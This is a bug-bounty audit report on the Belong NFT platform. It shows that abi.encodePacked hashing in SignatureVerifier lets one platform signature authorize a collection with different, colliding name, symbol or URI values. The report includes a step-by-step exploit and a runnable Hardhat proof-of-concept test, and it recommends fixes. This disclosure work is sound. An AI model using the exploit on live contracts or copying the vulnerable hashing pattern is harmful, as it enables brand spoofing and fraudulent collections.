# 57796 sc medium signature hashing collision in signatureverifier lets attacker deploy forged accesstoken credittoken metadata critical unintended alteration of what the nft represents&#x20;

**Submitted on Oct 28th 2025 at 22:51:15 UTC by @Codexstar for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57796
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/utils/SignatureVerifier.sol>
* **Impacts:** Unintended alteration of what the NFT represents (e.g. token URI, payload, artistic content)

## Description

### Brief / Intro

The platform authorizes collection deployments via signatures checked in `SignatureVerifier`. These hashes are built with `abi.encodePacked` over multiple dynamic strings, which is ambiguous. Different `(name, symbol, contractURI)` (or `(name, symbol, uri)`) tuples can collide to the same bytes, so a valid signature issued for one tuple can be replayed to deploy a collection with different, forged metadata. This allows unauthorized alteration of what the NFT represents (branding, symbol, contract URI), meeting the Critical impact category.

### Vulnerability Details

* The authorization hashing for AccessToken and CreditToken uses `abi.encodePacked` across multiple dynamic strings:

```solidity
// contracts/v2/utils/SignatureVerifier.sol (around line 53)
function checkAccessTokenInfo(address signer, AccessTokenInfo memory accessTokenInfo) external view {
    require(
        bytes(accessTokenInfo.metadata.name).length > 0 && bytes(accessTokenInfo.metadata.symbol).length > 0,
        EmptyMetadata(accessTokenInfo.metadata.name, accessTokenInfo.metadata.symbol)
    );

    require(
        signer.isValidSignatureNow(
            keccak256(
                abi.encodePacked(
                    accessTokenInfo.metadata.name,
                    accessTokenInfo.metadata.symbol,
                    accessTokenInfo.contractURI,
                    accessTokenInfo.feeNumerator,
                    block.chainid
                )
            ),
            accessTokenInfo.signature
        ),
        InvalidSignature()
    );
}
```

```solidity
// contracts/v2/utils/SignatureVerifier.sol (around line 81)
function checkCreditTokenInfo(address signer, bytes calldata signature, ERC1155Info calldata creditTokenInfo)
    external
    view
{
    require(
        bytes(creditTokenInfo.name).length > 0 && bytes(creditTokenInfo.symbol).length > 0,
        EmptyMetadata(creditTokenInfo.name, creditTokenInfo.symbol)
    );

    require(
        signer.isValidSignatureNow(
            keccak256(
                abi.encodePacked(creditTokenInfo.name, creditTokenInfo.symbol, creditTokenInfo.uri, block.chainid)
            ),
            signature
        ),
        InvalidSignature()
    );
}
```

* `Factory` trusts those verifications and proceeds with deployment:

```solidity
// contracts/v2/platform/Factory.sol (around lines 236-242)
factoryParameters.signerAddress.checkAccessTokenInfo(accessTokenInfo);

bytes32 hashedSalt = _metadataHash(accessTokenInfo.metadata.name, accessTokenInfo.metadata.symbol);

require(getNftInstanceInfo[hashedSalt].nftAddress == address(0), TokenAlreadyExists());
```

```solidity
// contracts/v2/platform/Factory.sol (around lines 306-317)
_nftFactoryParameters.signerAddress.checkCreditTokenInfo(signature, creditTokenInfo);

bytes32 hashedSalt = _metadataHash(creditTokenInfo.name, creditTokenInfo.symbol);

require(_creditTokenInstanceInfo[hashedSalt].creditToken == address(0), TokenAlreadyExists());
```

* Why exploitable: `abi.encodePacked` concatenates dynamic strings without boundaries. Example: `"abc"||"x"||""` equals `"ab"||"cx"||""`. So a signature for `(name='abc', symbol='x', contractURI='')` also verifies for `(name='ab', symbol='cx', contractURI='')`. The factory then deploys the collection with the forged metadata.

### Impact Details

* Matches in-scope Critical impact “Unintended alteration of what the NFT represents (e.g. token URI, payload, artistic content)”.
* Attacker can deploy unauthorized collections with altered `name`, `symbol`, `contractURI`/`uri`.
* Consequences: brand spoofing, user confusion, fraudulent collections appearing authorized, downstream marketplace/dapp trust issues.

### References

* contracts/v2/utils/SignatureVerifier.sol:53
* contracts/v2/utils/SignatureVerifier.sol:81
* contracts/v2/platform/Factory.sol:223
* contracts/v2/platform/Factory.sol:268

## Proof of Concept

{% stepper %}
{% step %}

### Step 1 — Obtain a legitimate platform signature for tuple A

Example for AccessToken: (name='abc', symbol='x', contractURI='', feeNumerator=f, chainId).
{% endstep %}

{% step %}

### Step 2 — Craft tuple B that collides under packed encoding

Example: (name='ab', symbol='cx', contractURI='', feeNumerator=f, chainId) because `abi.encodePacked('abc','x','',f,chainId) == abi.encodePacked('ab','cx','',f,chainId)`.
{% endstep %}

{% step %}

### Step 3 — Call Factory.produce with tuple B and reuse signature for tuple A

Use the signature issued for tuple A but submit tuple B to the factory.
{% endstep %}

{% step %}

### Step 4 — Signature verification passes and the factory deploys the collection

`SignatureVerifier.checkAccessTokenInfo` passes due to the collision; the factory deploys a collection with forged `(name, symbol, contractURI)`.
{% endstep %}

{% step %}

### Step 5 — The same applies to CreditToken

The same technique works against `Factory.produceCreditToken` by forging `(name, symbol, uri)` tuples.
{% endstep %}
{% endstepper %}

<details>

<summary>Runnable PoC (optional)</summary>

test/v2/platform/signature-collision.test.ts performs these steps end-to-end, deploying the factory, reusing a valid signature, and asserting that the forged metadata is stored for the new collection.

</details>

<details>

<summary>PoC Code</summary>

```typescript
import { expect } from 'chai';
import { ethers } from 'hardhat';

describe("AccessToken signature collision via abi.encodePacked (CRITICAL)", function () {
  it("forges different (name,symbol,contractURI) with same signature and bypasses authorization", async () => {
    const [deployer, platform, signer, creator] = await ethers.getSigners();

    // Deploy implementations
    const AccessTokenImpl = await ethers.getContractFactory("AccessToken", deployer);
    const accessTokenImpl = await AccessTokenImpl.deploy();
    await accessTokenImpl.deployed();

    const RoyaltiesReceiverImpl = await ethers.getContractFactory(
      "RoyaltiesReceiverV2",
      deployer
    );
    const royaltiesReceiverImpl = await RoyaltiesReceiverImpl.deploy();
    await royaltiesReceiverImpl.deployed();

    const CreditTokenImpl = await ethers.getContractFactory("CreditToken", deployer);
    const creditTokenImpl = await CreditTokenImpl.deploy();
    await creditTokenImpl.deployed();

    const VestingWalletImpl = await ethers.getContractFactory(
      "VestingWalletExtended",
      deployer
    );
    const vestingWalletImpl = await VestingWalletImpl.deploy();
    await vestingWalletImpl.deployed();

    // Deploy Factory
    const Factory = await ethers.getContractFactory("Factory", deployer);
    const factory = await Factory.deploy();
    await factory.deployed();

    // Initialize Factory
    await factory.initialize(
      {
        platformAddress: platform.address,
        signerAddress: signer.address,
        defaultPaymentCurrency: ethers.constants.AddressZero,
        platformCommission: 500,
        maxArraySize: 100,
        transferValidator: ethers.constants.AddressZero,
      },
      { amountToCreator: 0, amountToPlatform: 0 },
      {
        accessToken: accessTokenImpl.address,
        creditToken: creditTokenImpl.address,
        royaltiesReceiver: royaltiesReceiverImpl.address,
        vestingWallet: vestingWalletImpl.address,
      },
      [0, 0, 0, 0, 0]
    );

    const original = {
      name: "abc",
      symbol: "x",
      contractURI: "",
      feeNumerator: 0,
    };

    const forged = {
      name: "ab",
      symbol: "cx",
      contractURI: original.contractURI,
      feeNumerator: original.feeNumerator,
    };

    const chainId = (await ethers.provider.getNetwork()).chainId;
    const hash = ethers.utils.solidityKeccak256(
      ["string", "string", "string", "uint96", "uint256"],
      [original.name, original.symbol, original.contractURI, original.feeNumerator, chainId]
    );

    const signature = await signer.signMessage(ethers.utils.arrayify(hash));

    const accessTokenInfo = {
      paymentToken: ethers.constants.AddressZero,
      feeNumerator: forged.feeNumerator,
      transferable: true,
      maxTotalSupply: 10,
      mintPrice: 0,
      whitelistMintPrice: 0,
      collectionExpire: 0,
      metadata: { name: forged.name, symbol: forged.symbol },
      contractURI: forged.contractURI,
      signature,
    };

    const tx = await factory.connect(creator).produce(accessTokenInfo, ethers.constants.HashZero);
    const receipt = await tx.wait();
    const evt = receipt.events?.find((e) => e.event === "AccessTokenCreated");
    expect(evt).to.exist;

    const infoHash = ethers.utils.keccak256(
      ethers.utils.defaultAbiCoder.encode(["string", "string"], [forged.name, forged.symbol])
    );
    const stored = await factory.getNftInstanceInfo(infoHash);

    expect(stored.metadata.name).to.eq(forged.name);
    expect(stored.metadata.symbol).to.eq(forged.symbol);

    const forgedHash = ethers.utils.solidityKeccak256(
      ["string", "string", "string", "uint96", "uint256"],
      [forged.name, forged.symbol, forged.contractURI, forged.feeNumerator, chainId]
    );
    expect(forgedHash).to.eq(hash);
  });
});
```

</details>

## Recommendation

* Replace `abi.encodePacked` with `abi.encode` wherever signature hashes include dynamic types in `SignatureVerifier`.
* Bind signatures to all critical parameters intended to be controlled by the platform (payment token, prices, supply caps, transferability, etc.).
* Add nonce and expiry fields and bind the verifying contract address to prevent replay or cross-contract reuse.
